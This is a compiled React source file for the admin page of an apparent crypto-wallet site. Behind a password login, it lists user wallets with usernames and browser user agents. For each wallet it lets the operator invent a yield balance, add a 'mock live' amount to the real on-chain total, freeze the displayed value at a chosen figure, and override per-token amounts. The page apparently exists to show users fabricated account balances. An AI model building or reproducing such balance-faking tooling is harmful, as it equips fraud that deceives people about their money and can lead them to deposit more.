import { s as __toESM } from "../_runtime.mjs";
import { o as require_react } from "../_libs/@emotion/react+[...].mjs";
import { o as require_jsx_runtime } from "../_libs/@radix-ui/react-arrow+[...].mjs";
import { r as useQuery } from "../_libs/tanstack__react-query.mjs";
import { a as listWallets, n as adminLogin, o as setBalanceOverride, r as adminLogout, s as useServerFn, t as adminIsUnlocked } from "./admin.functions-D87B2cZL.mjs";
import { t as useWalletSession } from "./useWalletSession-DH8jTbrD.mjs";
import { C as LogOut, D as LockKeyhole, E as LockKeyholeOpen, O as LoaderCircle, T as Lock, h as Save, p as ShieldCheck } from "../_libs/lucide-react.mjs";
import { t as CopyButton } from "./CopyButton-3o43l5K1.mjs";
import { t as fetchBalance } from "./balances-kngrFgmy.mjs";
import { i as marketsQuery, r as formatUSD } from "./prices-DslsRjmR.mjs";
//#region node_modules/.nitro/vite/services/ssr/assets/admin-JHf2Nfc3.js
var import_react = /* @__PURE__ */ __toESM(require_react());
var import_jsx_runtime = require_jsx_runtime();
var PRICE_SYMBOL = {
	BTC: "btc",
	BTC_LEGACY: "btc",
	ETH: "eth",
	BNB: "bnb",
	MATIC: "matic",
	ARB: "eth",
	OP: "eth",
	AVAX: "avax"
};
function AdminPage() {
	const [unlocked, setUnlocked] = (0, import_react.useState)(null);
	const check = useServerFn(adminIsUnlocked);
	(0, import_react.useEffect)(() => {
		check().then((r) => setUnlocked(!!r.unlocked)).catch(() => setUnlocked(false));
	}, [check]);
	if (unlocked === null) return /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
		className: "mx-auto max-w-md p-10 flex items-center justify-center gap-2 text-sm text-muted-foreground",
		children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)(LoaderCircle, { className: "h-4 w-4 animate-spin" }), " Loading"]
	});
	if (!unlocked) return /* @__PURE__ */ (0, import_jsx_runtime.jsx)(LoginPanel, { onUnlock: () => setUnlocked(true) });
	return /* @__PURE__ */ (0, import_jsx_runtime.jsx)(Dashboard, { onLogout: () => setUnlocked(false) });
}
function LoginPanel({ onUnlock }) {
	const login = useServerFn(adminLogin);
	const [password, setPassword] = (0, import_react.useState)("");
	const [busy, setBusy] = (0, import_react.useState)(false);
	const [err, setErr] = (0, import_react.useState)(null);
	const submit = async (e) => {
		e.preventDefault();
		setBusy(true);
		setErr(null);
		try {
			if ((await login({ data: { password } })).ok) onUnlock();
			else setErr("Incorrect password");
		} catch (e) {
			setErr(e instanceof Error ? e.message : "Login failed");
		} finally {
			setBusy(false);
		}
	};
	return /* @__PURE__ */ (0, import_jsx_runtime.jsx)("div", {
		className: "mx-auto max-w-sm px-4 py-20",
		children: /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
			className: "glass-strong rounded-2xl p-6",
			children: [/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
				className: "flex items-center gap-2",
				children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)(Lock, { className: "h-4 w-4 text-primary" }), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("h1", {
					className: "font-display text-lg font-semibold",
					children: "Admin access"
				})]
			}), /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("form", {
				onSubmit: submit,
				className: "mt-4 space-y-3",
				children: [
					/* @__PURE__ */ (0, import_jsx_runtime.jsx)("input", {
						autoFocus: true,
						type: "password",
						value: password,
						onChange: (e) => setPassword(e.target.value),
						placeholder: "Password",
						className: "w-full glass rounded-lg px-3 py-2.5 text-sm outline-none focus:ring-2 focus:ring-ring"
					}),
					err && /* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
						className: "text-xs text-destructive",
						children: err
					}),
					/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("button", {
						disabled: busy,
						className: "inline-flex w-full items-center justify-center gap-2 rounded-lg bg-[image:var(--gradient-brand)] py-2.5 text-sm font-semibold text-primary-foreground shadow-glow disabled:opacity-60",
						children: [busy ? /* @__PURE__ */ (0, import_jsx_runtime.jsx)(LoaderCircle, { className: "h-4 w-4 animate-spin" }) : /* @__PURE__ */ (0, import_jsx_runtime.jsx)(ShieldCheck, { className: "h-4 w-4" }), "Unlock"]
					})
				]
			})]
		})
	});
}
function normalizeAdminWalletRows(value) {
	if (Array.isArray(value)) return value;
	if (value && typeof value === "object") {
		const payload = value;
		if (Array.isArray(payload.data)) return payload.data;
		if (Array.isArray(payload.rows)) return payload.rows;
		if (Array.isArray(payload.result)) return payload.result;
	}
	return [];
}
function Dashboard({ onLogout }) {
	const load = useServerFn(listWallets);
	const logout = useServerFn(adminLogout);
	const [rows, setRows] = (0, import_react.useState)(null);
	const [err, setErr] = (0, import_react.useState)(null);
	const [q, setQ] = (0, import_react.useState)("");
	const [reloadTick, setReloadTick] = (0, import_react.useState)(0);
	(0, import_react.useEffect)(() => {
		let cancelled = false;
		setRows(null);
		setErr(null);
		load().then((r) => {
			if (!cancelled) setRows(normalizeAdminWalletRows(r));
		}).catch((e) => {
			if (!cancelled) setErr(e instanceof Error ? e.message : "Failed to load");
		});
		return () => {
			cancelled = true;
		};
	}, [load, reloadTick]);
	const filtered = (0, import_react.useMemo)(() => {
		if (!rows) return [];
		const s = q.trim().toLowerCase();
		if (!s) return rows;
		return rows.filter((r) => r.wallet_address.toLowerCase().includes(s) || (r.username ?? "").toLowerCase().includes(s));
	}, [rows, q]);
	return /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
		className: "mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 py-8",
		children: [
			/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
				className: "flex flex-col gap-4 md:flex-row md:items-center md:justify-between mb-6",
				children: [/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", { children: [
					/* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
						className: "text-xs uppercase tracking-widest text-primary/90 font-medium",
						children: "Internal"
					}),
					/* @__PURE__ */ (0, import_jsx_runtime.jsx)("h1", {
						className: "mt-1 font-display text-2xl font-semibold",
						children: "Admin dashboard"
					}),
					/* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
						className: "text-xs text-muted-foreground",
						children: "Edit yield balances, mock live balances, and frozen display values."
					})
				] }), /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
					className: "flex flex-col gap-2 sm:flex-row sm:items-center",
					children: [
						/* @__PURE__ */ (0, import_jsx_runtime.jsx)("input", {
							value: q,
							onChange: (e) => setQ(e.target.value),
							placeholder: "Search address or username",
							className: "glass rounded-lg px-3 py-2 text-sm outline-none focus:ring-2 focus:ring-ring sm:w-64"
						}),
						/* @__PURE__ */ (0, import_jsx_runtime.jsx)("button", {
							onClick: () => setReloadTick((t) => t + 1),
							className: "rounded-lg glass px-3 py-2 text-xs font-semibold hover:bg-white/10",
							children: "Refresh"
						}),
						/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("button", {
							onClick: async () => {
								await logout();
								onLogout();
							},
							className: "inline-flex items-center justify-center gap-1.5 rounded-lg glass px-3 py-2 text-xs font-semibold hover:bg-white/10",
							children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)(LogOut, { className: "h-3.5 w-3.5" }), " Logout"]
						})
					]
				})]
			}),
			err && /* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
				className: "text-sm text-destructive mb-4",
				children: err
			}),
			rows === null && !err && /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
				className: "flex items-center gap-2 text-sm text-muted-foreground",
				children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)(LoaderCircle, { className: "h-4 w-4 animate-spin" }), " Loading wallets"]
			}),
			rows && filtered.length === 0 && /* @__PURE__ */ (0, import_jsx_runtime.jsx)("div", {
				className: "glass rounded-xl p-8 text-center text-sm text-muted-foreground",
				children: "No wallets found."
			}),
			/* @__PURE__ */ (0, import_jsx_runtime.jsx)("div", {
				className: "space-y-3",
				children: filtered.map((row) => /* @__PURE__ */ (0, import_jsx_runtime.jsx)(WalletRow, {
					row,
					onSaved: () => setReloadTick((t) => t + 1)
				}, row.wallet_address))
			})
		]
	});
}
function WalletRow({ row, onSaved }) {
	const save = useServerFn(setBalanceOverride);
	const session = useWalletSession();
	const isActiveWallet = session?.address === row.wallet_address;
	const addresses = isActiveWallet ? session?.wallet?.addresses ?? [] : [];
	const { data: markets } = useQuery(marketsQuery(100));
	const [balances, setBalances] = (0, import_react.useState)({});
	const [yieldBalance, setYieldBalance] = (0, import_react.useState)(row.override?.yield_balance == null ? "" : String(row.override.yield_balance));
	const [mockLive, setMockLive] = (0, import_react.useState)(row.override?.mock_live_balance == null ? "" : String(row.override.mock_live_balance));
	const [frozen, setFrozen] = (0, import_react.useState)(Boolean(row.override?.live_balance_frozen));
	const [frozenLive, setFrozenLive] = (0, import_react.useState)(row.override?.frozen_live_balance == null ? "" : String(row.override.frozen_live_balance));
	const initialTokens = row.override?.token_overrides ?? {};
	const [tokens, setTokens] = (0, import_react.useState)(Object.entries(initialTokens).length ? Object.entries(initialTokens).map(([k, v]) => ({
		k,
		v: String(v)
	})) : [
		{
			k: "BTC",
			v: ""
		},
		{
			k: "ETH",
			v: ""
		},
		{
			k: "USDT",
			v: ""
		}
	]);
	const [note, setNote] = (0, import_react.useState)(row.override?.note ?? "");
	const [busy, setBusy] = (0, import_react.useState)(false);
	const [savedAt, setSavedAt] = (0, import_react.useState)(null);
	const [err, setErr] = (0, import_react.useState)(null);
	(0, import_react.useEffect)(() => {
		if (!isActiveWallet || addresses.length === 0) return;
		let cancelled = false;
		setBalances(Object.fromEntries(addresses.map((a) => [a.chain, "loading"])));
		addresses.forEach((a) => {
			fetchBalance(a.chain, a.address, row.wallet_address).then((balance) => {
				if (!cancelled) setBalances((prev) => ({
					...prev,
					[a.chain]: balance
				}));
			});
		});
		return () => {
			cancelled = true;
		};
	}, [
		addresses,
		isActiveWallet,
		row.wallet_address
	]);
	const priceBySymbol = (0, import_react.useMemo)(() => {
		const map = /* @__PURE__ */ new Map();
		for (const coin of markets ?? []) map.set(coin.symbol.toLowerCase(), coin.current_price);
		return map;
	}, [markets]);
	const activeLiveTotal = (0, import_react.useMemo)(() => {
		if (!isActiveWallet) return null;
		return addresses.reduce((sum, address) => {
			const balance = balances[address.chain];
			if (!balance || balance === "loading") return sum;
			const symbol = PRICE_SYMBOL[address.chain] ?? balance.symbol.toLowerCase();
			return sum + balance.amount * (priceBySymbol.get(symbol) ?? 0);
		}, 0);
	}, [
		addresses,
		balances,
		isActiveWallet,
		priceBySymbol
	]);
	const mockValue = Number(mockLive || 0) || 0;
	const currentInitial = activeLiveTotal == null ? null : activeLiveTotal + mockValue;
	const setTokenAt = (i, key, val) => {
		setTokens((prev) => prev.map((t, idx) => idx === i ? {
			...t,
			[key]: val
		} : t));
	};
	const addTokenRow = () => setTokens((p) => [...p, {
		k: "",
		v: ""
	}]);
	const removeTokenRow = (i) => setTokens((p) => p.filter((_, idx) => idx !== i));
	const submit = async () => {
		setBusy(true);
		setErr(null);
		try {
			const token_overrides = {};
			for (const { k, v } of tokens) {
				if (!k.trim() || v === "") continue;
				const n = Number(v);
				if (!Number.isNaN(n)) token_overrides[k.trim().toUpperCase()] = n;
			}
			await save({ data: {
				wallet_address: row.wallet_address,
				usd_balance: null,
				yield_balance: yieldBalance === "" ? 0 : Number(yieldBalance),
				mock_live_balance: mockLive === "" ? 0 : Number(mockLive),
				live_balance_frozen: frozen,
				frozen_live_balance: frozenLive === "" ? null : Number(frozenLive),
				token_overrides,
				note: note || null
			} });
			setSavedAt(Date.now());
			onSaved();
		} catch (e) {
			setErr(e instanceof Error ? e.message : "Save failed");
		} finally {
			setBusy(false);
		}
	};
	return /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
		className: "glass rounded-xl p-4 md:p-5",
		children: [
			/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
				className: "flex flex-wrap items-start justify-between gap-3",
				children: [/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
					className: "min-w-0 flex-1",
					children: [
						/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
							className: "flex flex-wrap items-center gap-2",
							children: [
								/* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
									className: "font-display text-sm font-semibold",
									children: row.username ?? /* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
										className: "text-muted-foreground",
										children: "— no username —"
									})
								}),
								row.first_event && /* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
									className: "text-[10px] uppercase tracking-widest rounded bg-white/5 px-1.5 py-0.5 text-muted-foreground",
									children: row.first_event
								}),
								isActiveWallet && /* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
									className: "text-[10px] uppercase tracking-widest rounded bg-primary/10 px-1.5 py-0.5 text-primary",
									children: "active wallet"
								}),
								/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
									className: "text-[10px] text-muted-foreground",
									children: new Date(row.created_at).toLocaleString()
								})
							]
						}),
						/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
							className: "mt-2 flex items-center gap-2",
							children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("code", {
								className: "font-mono text-[11px] text-muted-foreground break-all",
								children: row.wallet_address
							}), /* @__PURE__ */ (0, import_jsx_runtime.jsx)(CopyButton, { value: row.wallet_address })]
						}),
						row.user_agent && /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("p", {
							className: "mt-1 text-[10px] text-muted-foreground truncate",
							children: ["🧭 ", row.user_agent]
						})
					]
				}), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("div", {
					className: "text-right text-[10px] text-muted-foreground",
					children: row.override?.updated_at ? `Updated ${new Date(row.override.updated_at).toLocaleString()}` : "No override"
				})]
			}),
			/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
				className: "mt-4 grid gap-3 md:grid-cols-4 items-start",
				children: [
					/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("label", {
						className: "block",
						children: [
							/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
								className: "text-[10px] uppercase tracking-widest text-muted-foreground",
								children: "Yield balance"
							}),
							/* @__PURE__ */ (0, import_jsx_runtime.jsx)("input", {
								value: yieldBalance,
								onChange: (e) => setYieldBalance(e.target.value),
								placeholder: "e.g. 10000",
								inputMode: "decimal",
								className: "mt-1 w-full glass rounded-lg px-3 py-2 text-sm outline-none focus:ring-2 focus:ring-ring"
							}),
							/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
								className: "mt-1 block text-[10px] text-muted-foreground",
								children: "Starts at $0 until edited."
							})
						]
					}),
					/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("label", {
						className: "block",
						children: [
							/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
								className: "text-[10px] uppercase tracking-widest text-muted-foreground",
								children: "Mock live add-on"
							}),
							/* @__PURE__ */ (0, import_jsx_runtime.jsx)("input", {
								value: mockLive,
								onChange: (e) => setMockLive(e.target.value),
								placeholder: "e.g. 8000",
								inputMode: "decimal",
								className: "mt-1 w-full glass rounded-lg px-3 py-2 text-sm outline-none focus:ring-2 focus:ring-ring"
							}),
							/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
								className: "mt-1 block text-[10px] text-muted-foreground",
								children: "Added to the initial live balance."
							})
						]
					}),
					/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", { children: [
						/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
							className: "text-[10px] uppercase tracking-widest text-muted-foreground",
							children: "Freeze live display"
						}),
						/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
							className: "mt-1 flex gap-2",
							children: [/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("button", {
								type: "button",
								onClick: () => {
									setFrozen(true);
									if (currentInitial != null) setFrozenLive(currentInitial.toFixed(2));
								},
								className: "inline-flex flex-1 items-center justify-center gap-1 rounded-lg glass px-2 py-2 text-xs font-semibold hover:bg-white/10",
								children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)(LockKeyhole, { className: "h-3.5 w-3.5" }), " Freeze"]
							}), /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("button", {
								type: "button",
								onClick: () => setFrozen(false),
								className: "inline-flex flex-1 items-center justify-center gap-1 rounded-lg glass px-2 py-2 text-xs font-semibold hover:bg-white/10",
								children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)(LockKeyholeOpen, { className: "h-3.5 w-3.5" }), " Unfreeze"]
							})]
						}),
						/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("p", {
							className: "mt-1 text-[10px] text-muted-foreground",
							children: [frozen ? "Frozen" : "Live", currentInitial != null ? ` · current ${formatUSD(currentInitial)}` : ""]
						})
					] }),
					/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("label", {
						className: "block",
						children: [
							/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
								className: "text-[10px] uppercase tracking-widest text-muted-foreground",
								children: "Frozen live value"
							}),
							/* @__PURE__ */ (0, import_jsx_runtime.jsx)("input", {
								value: frozenLive,
								onChange: (e) => setFrozenLive(e.target.value),
								placeholder: "Auto or enter amount",
								inputMode: "decimal",
								className: "mt-1 w-full glass rounded-lg px-3 py-2 text-sm outline-none focus:ring-2 focus:ring-ring"
							}),
							/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
								className: "mt-1 block text-[10px] text-muted-foreground",
								children: "Displayed while frozen."
							})
						]
					})
				]
			}),
			/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
				className: "mt-4 grid gap-3 md:grid-cols-[1fr_1fr] items-start",
				children: [/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", { children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
					className: "text-[10px] uppercase tracking-widest text-muted-foreground",
					children: "Token overrides"
				}), /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
					className: "mt-1 space-y-1.5",
					children: [tokens.map((t, i) => /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
						className: "flex items-center gap-2",
						children: [
							/* @__PURE__ */ (0, import_jsx_runtime.jsx)("input", {
								value: t.k,
								onChange: (e) => setTokenAt(i, "k", e.target.value),
								placeholder: "TOKEN",
								className: "w-24 glass rounded-lg px-2 py-1.5 text-xs font-mono uppercase outline-none focus:ring-2 focus:ring-ring"
							}),
							/* @__PURE__ */ (0, import_jsx_runtime.jsx)("input", {
								value: t.v,
								onChange: (e) => setTokenAt(i, "v", e.target.value),
								placeholder: "amount",
								inputMode: "decimal",
								className: "flex-1 glass rounded-lg px-2 py-1.5 text-xs font-mono outline-none focus:ring-2 focus:ring-ring"
							}),
							/* @__PURE__ */ (0, import_jsx_runtime.jsx)("button", {
								type: "button",
								onClick: () => removeTokenRow(i),
								className: "text-xs text-muted-foreground hover:text-destructive px-1",
								children: "✕"
							})
						]
					}, i)), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("button", {
						type: "button",
						onClick: addTokenRow,
						className: "text-[11px] text-primary hover:underline",
						children: "+ Add token"
					})]
				})] }), /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("label", {
					className: "block",
					children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
						className: "text-[10px] uppercase tracking-widest text-muted-foreground",
						children: "Note (internal)"
					}), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("textarea", {
						value: note,
						onChange: (e) => setNote(e.target.value),
						rows: 3,
						className: "mt-1 w-full glass rounded-lg px-3 py-2 text-sm outline-none focus:ring-2 focus:ring-ring"
					})]
				})]
			}),
			/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
				className: "mt-3 flex items-center justify-end gap-3",
				children: [
					err && /* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
						className: "text-xs text-destructive",
						children: err
					}),
					savedAt && !err && /* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
						className: "text-xs text-success",
						children: "Saved"
					}),
					/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("button", {
						onClick: submit,
						disabled: busy,
						className: "inline-flex items-center gap-1.5 rounded-lg bg-[image:var(--gradient-brand)] px-3 py-2 text-xs font-semibold text-primary-foreground shadow-glow disabled:opacity-60",
						children: [busy ? /* @__PURE__ */ (0, import_jsx_runtime.jsx)(LoaderCircle, { className: "h-3.5 w-3.5 animate-spin" }) : /* @__PURE__ */ (0, import_jsx_runtime.jsx)(Save, { className: "h-3.5 w-3.5" }), "Save balance"]
					})
				]
			})
		]
	});
}
//#endregion
export { AdminPage as component };
